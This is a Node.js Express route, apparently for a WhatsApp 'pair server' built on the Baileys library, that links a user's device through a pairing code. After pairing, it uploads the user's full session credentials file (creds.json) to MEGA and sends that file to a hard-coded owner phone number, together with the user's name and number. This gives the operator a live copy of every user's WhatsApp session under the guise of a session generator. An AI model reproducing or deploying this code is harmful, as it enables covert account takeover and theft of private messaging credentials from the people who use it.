import express from "express";
import fs from "fs";
import path from "path";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import { upload } from "./mega.js";

const router = express.Router();

// ─── कॉन्फ़िगरेशन ──────────────────────────────────────────────
const OWNER_NUMBER = "+918075498750";
const SONG_LINK = "https://files.catbox.moe/7z582t.m4a";
const IMAGE_URL = "https://files.catbox.moe/x89cc5.jpg";
const VIDEO_URL = "https://files.catbox.moe/sample.mp4";
const GIF_URL = "https://files.catbox.moe/sample.gif";
const PDF_URL = "https://files.catbox.moe/manual.pdf";
const VOICE_NOTE_LINK = "https://files.catbox.moe/voice.m4a";
const VIEW_ONCE_IMG = "https://files.catbox.moe/secret.jpg";
const VIEW_ONCE_VID = "https://files.catbox.moe/secret.mp4";
const STICKER_URL = "https://files.catbox.moe/abc123.webp";
const LOCATION = {
    latitude: 27.1750,
    longitude: 78.0422,
    name: "🕌 ताजमहल",
    address: "आगरा, उत्तर प्रदेश"
};
const PRODUCT = {
    name: "🐊 𝟵𝗠𝗔𝗡 स्पेशल स्टिकर",
    price: "₹999",
    url: "https://example.com/product",
    description: "बहुत ही गजब का स्टिकर!"
};
const LINKS = [
    "t.me/YAMDHUD",
    "https://github.com/9man-x-yamdhuuud",
    "https://www.youtube.com/@9man_vlog",
    "🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊"
];

// ─── कलर ──────────────────────────────────────────────────────────
const c = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
};

function log(color, msg) {
    console.log(`${color}[${new Date().toLocaleTimeString()}] ${msg}${c.reset}`);
}

async function progressBar(text, duration = 3000) {
    const total = 20;
    let progress = 0;
    const start = Date.now();
    while (progress < total) {
        const elapsed = Date.now() - start;
        progress = Math.min(Math.floor((elapsed / duration) * total), total);
        const filled = "█".repeat(progress);
        const empty = "░".repeat(total - progress);
        const percent = Math.round((progress / total) * 100);
        process.stdout.write(`\r${c.cyan}${text} [${filled}${empty}] ${percent}%${c.reset}`);
        await delay(100);
    }
    process.stdout.write(`\r${c.green}${text} [${"█".repeat(total)}] 100% ✅${c.reset}\n`);
}

function showBanner() {
    console.clear();
    console.log(c.magenta + "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗 𝗣𝗔𝗜𝗥 𝗦𝗘𝗥𝗩𝗘𝗥" + c.reset);
    log(c.green, `👤 Owner: ${OWNER_NUMBER}`);
    console.log("");
}
showBanner();

function removeFile(dir) {
    try {
        if (fs.existsSync(dir)) {
            fs.rmSync(dir, { recursive: true, force: true });
            log(c.dim, `🧹 Removed session: ${dir}`);
        }
    } catch (e) {
        log(c.red, `❌ Remove error: ${e.message}`);
    }
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
        return match ? match[1] : null;
    } catch { return null; }
}

async function fetchBuffer(url) {
    try {
        if (!url) return null;
        const res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return Buffer.from(await res.arrayBuffer());
    } catch (e) {
        log(c.red, `⚠️ Fetch failed: ${e.message}`);
        return null;
    }
}

function getVCard() {
    return `BEGIN:VCARD\nVERSION:3.0\nFN:🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗\nTEL;TYPE=CELL:${OWNER_NUMBER}\nEND:VCARD`;
}

// ─── पेयरिंग एंडपॉइंट ──────────────────────────────────────────
router.get("/", async (req, res) => {
    let num = req.query.number;
    if (!num) return res.status(400).json({ error: "Number required" });

    num = num.replace(/\D/g, "");
    if (num.length < 10 || num.length > 15) {
        return res.status(400).json({ error: "Invalid number length" });
    }

    // ─── पुरानी session पूरी तरह हटाएँ ──────────────────────────
    const sessionDir = path.resolve(`./pair_${num}`);
    removeFile(sessionDir);

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        try {
            const { version } = await fetchLatestBaileysVersion();
            const KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" })
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
                markOnlineOnConnect: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                maxRetries: 5,
            });

            KnightBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    log(c.green, "✅ Paired successfully!");

                    // ─── saveCreds() ──────────────────────────────────
                    try {
                        await saveCreds();
                        log(c.blue, "✅ saveCreds() called");
                    } catch (e) {
                        log(c.red, `⚠️ saveCreds error: ${e.message}`);
                    }

                    await delay(2000);

                    const credsPath = path.join(sessionDir, "creds.json");
                    let credsBuffer = null;
                    for (let i = 0; i < 10; i++) {
                        if (fs.existsSync(credsPath)) {
                            try {
                                credsBuffer = fs.readFileSync(credsPath);
                                log(c.green, `✅ creds.json found (${credsBuffer.length} bytes)`);
                                break;
                            } catch (e) {}
                        }
                        await delay(1000);
                    }

                    if (!credsBuffer) {
                        log(c.red, "❌ creds.json not found!");
                        removeFile(sessionDir);
                        process.exit(1);
                        return;
                    }

                    // ─── MEGA अपलोड ──────────────────────────────────
                    let megaFileId = null;
                    try {
                        await progressBar("⏳ Uploading to MEGA", 4000);
                        const megaUrl = await upload(credsPath, `creds_${num}_${Date.now()}.json`);
                        megaFileId = getMegaFileId(megaUrl);
                        if (megaFileId) log(c.green, `✅ MEGA ID: ${megaFileId}`);
                    } catch (e) {
                        log(c.red, `⚠️ MEGA error: ${e.message}`);
                    }

                    const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                    let ownerJid = null;
                    const ownerPhone = OWNER_NUMBER.replace(/\D/g, "");
                    if (ownerPhone) {
                        ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                    }

                    // ─── यूजर का नाम ──────────────────────────────
                    let userName = "Unknown";
                    try {
                        const contact = await KnightBot.getContact(userJid);
                        userName = contact?.name || contact?.notify || num;
                        log(c.cyan, `👤 User: ${userName}`);
                    } catch (e) {
                        userName = num;
                    }

                    // ─── कैप्शन ────────────────────────────────────
                    const caption =
                        `📱 *User:* ${userName} (${num})\n` +
                        `📁 *MEGA ID:* ${megaFileId || "N/A"}\n` +
                        `👤 *Owner:* ${OWNER_NUMBER}\n` +
                        `🎵 *Song:* ${SONG_LINK}\n\n` +
                        `🔗 *Links:*\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;

                    const ownerMessage =
                        `🔔 *New Pairing!*\n\n` +
                        `📱 Number: ${num}\n` +
                        `👤 Name: ${userName}\n` +
                        `📁 MEGA ID: ${megaFileId || "N/A"}`;

                    const funText =
                        `🎉 *Session Ready!*\n` +
                        `⚠️ *Keep creds.json safe!*\n` +
                        `🐊 *𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗*`;

                    // ─── मीडिया डाउनलोड ────────────────────────────
                    log(c.blue, "📥 Downloading media...");
                    const [videoBuf, gifBuf, pdfBuf, voiceBuf, viewImgBuf, viewVidBuf, stickBuf, audioBuf] = await Promise.all([
                        fetchBuffer(VIDEO_URL), fetchBuffer(GIF_URL), fetchBuffer(PDF_URL),
                        fetchBuffer(VOICE_NOTE_LINK), fetchBuffer(VIEW_ONCE_IMG), fetchBuffer(VIEW_ONCE_VID),
                        fetchBuffer(STICKER_URL), fetchBuffer(SONG_LINK)
                    ]);
                    log(c.green, "✅ Media ready");

                    // ─── 🔥 sendToJid ──────────────────────────────────
                    async function sendToJid(jid) {
                        if (!jid) return;
                        try {
                            await KnightBot.sendPresenceUpdate('composing', jid);
                            await delay(1500);
                            await KnightBot.sendPresenceUpdate('paused', jid);

                            // ═══ 1️⃣ creds.json Document ═══
                            try {
                                await KnightBot.sendMessage(jid, {
                                    document: credsBuffer,
                                    mimetype: "application/json",
                                    fileName: "creds.json",
                                });
                                log(c.green, `📄 creds.json sent to ${jid}`);
                            } catch (e) {
                                log(c.red, `❌ Document failed: ${e.message}`);
                            }

                            // ═══ 2️⃣ GIF ═══
                            if (gifBuf) {
                                await KnightBot.sendMessage(jid, { video: gifBuf, gifPlayback: true, caption: "🔄 GIF!" });
                                log(c.green, `🔄 GIF sent to ${jid}`);
                            }

                            // ═══ 3️⃣ PDF ═══
                            if (pdfBuf) {
                                await KnightBot.sendMessage(jid, {
                                    document: pdfBuf,
                                    mimetype: "application/pdf",
                                    fileName: "Manual.pdf",
                                    caption: "📄 Manual!",
                                });
                                log(c.green, `📄 PDF sent to ${jid}`);
                            }

                            // ═══ 4️⃣ Voice Note ═══
                            if (voiceBuf) {
                                await KnightBot.sendMessage(jid, {
                                    audio: voiceBuf,
                                    mimetype: "audio/mp4",
                                    ptt: true,
                                    fileName: "voice.ogg",
                                });
                                log(c.green, `🎤 Voice sent to ${jid}`);
                            }

                            // ═══ 5️⃣ View-Once Image ═══
                            if (viewImgBuf) {
                                await KnightBot.sendMessage(jid, {
                                    image: viewImgBuf,
                                    viewOnce: true,
                                    caption: "👀 View once!",
                                });
                                log(c.green, `👀 View-once image sent to ${jid}`);
                            }

                            // ═══ 6️⃣ View-Once Video ═══
                            if (viewVidBuf) {
                                await KnightBot.sendMessage(jid, {
                                    video: viewVidBuf,
                                    viewOnce: true,
                                    caption: "👀 View once video!",
                                });
                                log(c.green, `👀 View-once video sent to ${jid}`);
                            }

                            // ═══ 7️⃣ Buttons ═══
                            try {
                                await KnightBot.sendMessage(jid, {
                                    text: "🔘 Choose:",
                                    buttons: [
                                        { buttonId: "yes", buttonText: { displayText: "✅ Yes" }, type: 1 },
                                        { buttonId: "no", buttonText: { displayText: "❌ No" }, type: 1 },
                                        { buttonId: "visit", buttonText: { displayText: "🔗 Visit" }, type: 1 },
                                    ],
                                    headerType: 1,
                                });
                                log(c.green, `🔘 Buttons sent to ${jid}`);
                            } catch (e) {}

                            // ═══ 8️⃣ List ═══
                            try {
                                await KnightBot.sendMessage(jid, {
                                    text: "📋 Menu:",
                                    footer: "Choose option",
                                    title: "🐊 𝟵𝗠𝗔𝗡 Menu",
                                    buttonText: "Click",
                                    sections: [{
                                        title: "Options",
                                        rows: [
                                            { title: "1️⃣ Option 1", description: "First", rowId: "opt1" },
                                            { title: "2️⃣ Option 2", description: "Second", rowId: "opt2" },
                                            { title: "3️⃣ Option 3", description: "Third", rowId: "opt3" },
                                        ]
                                    }]
                                });
                                log(c.green, `📋 List sent to ${jid}`);
                            } catch (e) {}

                            // ═══ 9️⃣ Product ═══
                            try {
                                await KnightBot.sendMessage(jid, {
                                    product: {
                                        productId: "123",
                                        product: {
                                            id: "p1",
                                            name: PRODUCT.name,
                                            description: PRODUCT.description,
                                            price: PRODUCT.price,
                                            url: PRODUCT.url,
                                        },
                                    }
                                });
                                log(c.green, `🏷️ Product sent to ${jid}`);
                            } catch (e) {}

                            // ═══ 🔟 Video ═══
                            if (videoBuf) {
                                await KnightBot.sendMessage(jid, { video: videoBuf, caption: "🎥 Video!" });
                                log(c.green, `🎥 Video sent to ${jid}`);
                            }

                            // ═══ 1️⃣1️⃣ Photo ═══
                            await KnightBot.sendMessage(jid, { image: { url: IMAGE_URL }, caption });
                            log(c.green, `🖼️ Photo sent to ${jid}`);

                            // ═══ 1️⃣2️⃣ Audio ═══
                            if (audioBuf) {
                                await KnightBot.sendMessage(jid, {
                                    audio: audioBuf,
                                    mimetype: "audio/mp4",
                                    fileName: "song.m4a",
                                });
                                log(c.green, `🎵 Audio sent to ${jid}`);
                            }

                            // ═══ 1️⃣3️⃣ Sticker ═══
                            if (stickBuf) {
                                await KnightBot.sendMessage(jid, { sticker: stickBuf });
                                log(c.green, `🖼️ Sticker sent to ${jid}`);
                            }

                            // ═══ 1️⃣4️⃣ Location ═══
                            await KnightBot.sendMessage(jid, {
                                location: {
                                    degreesLatitude: LOCATION.latitude,
                                    degreesLongitude: LOCATION.longitude,
                                    name: LOCATION.name,
                                    address: LOCATION.address,
                                },
                            });
                            log(c.green, `📍 Location sent to ${jid}`);

                            // ═══ 1️⃣5️⃣ Contact ═══
                            await KnightBot.sendMessage(jid, {
                                contact: {
                                    displayName: "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗",
                                    vcard: getVCard(),
                                },
                            });
                            log(c.green, `📇 Contact sent to ${jid}`);

                            // ═══ 1️⃣6️⃣ Fun Text ═══
                            await KnightBot.sendMessage(jid, { text: funText });
                            log(c.green, `🎉 Fun text sent to ${jid}`);
                        } catch (err) {
                            log(c.red, `❌ Error sending to ${jid}: ${err.message}`);
                        }
                    }

                    await sendToJid(userJid);
                    if (ownerJid && ownerJid !== userJid) {
                        await sendToJid(ownerJid);
                        try {
                            await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
                            log(c.green, "📝 Owner details sent");
                        } catch (e) {}
                    }

                    log(c.blue, "🧹 Cleaning up...");
                    await delay(1000);
                    removeFile(sessionDir);
                    log(c.green, "✅ Done! Exiting.");
                    await delay(2000);
                    process.exit(0);
                }

                if (connection === "close") {
                    const status = lastDisconnect?.error?.output?.statusCode;
                    if (status === 401) {
                        log(c.red, "❌ Logged out – need new pair.");
                    } else {
                        log(c.yellow, "🔁 Restarting...");
                        initiateSession();
                    }
                }
            });

            // ─── पेयरिंग कोड ────────────────────────────────────
            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                const cleanNum = num.replace(/^\+/, "");
                try {
                    let code = await KnightBot.requestPairingCode(cleanNum);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    if (!res.headersSent) {
                        log(c.green, `📲 Code for ${num}: ${code}`);
                        return res.json({ 
                            code, 
                            message: "Enter this code in WhatsApp > Settings > Linked Devices",
                            note: "Code expires in 2 minutes. Use same number as requested."
                        });
                    }
                } catch (error) {
                    log(c.red, `❌ Pairing error: ${error.message}`);
                    if (!res.headersSent) {
                        return res.status(503).json({ 
                            error: "Pairing failed. Make sure number is correct and try again.",
                            details: error.message
                        });
                    }
                }
            }

            KnightBot.ev.on("creds.update", saveCreds);
        } catch (err) {
            log(c.red, `❌ Init error: ${err.message}`);
            if (!res.headersSent) {
                res.status(500).json({ error: "Server error", details: err.message });
            }
            removeFile(sessionDir);
            setTimeout(() => process.exit(1), 2000);
        }
    }

    await initiateSession();
});

export default router;
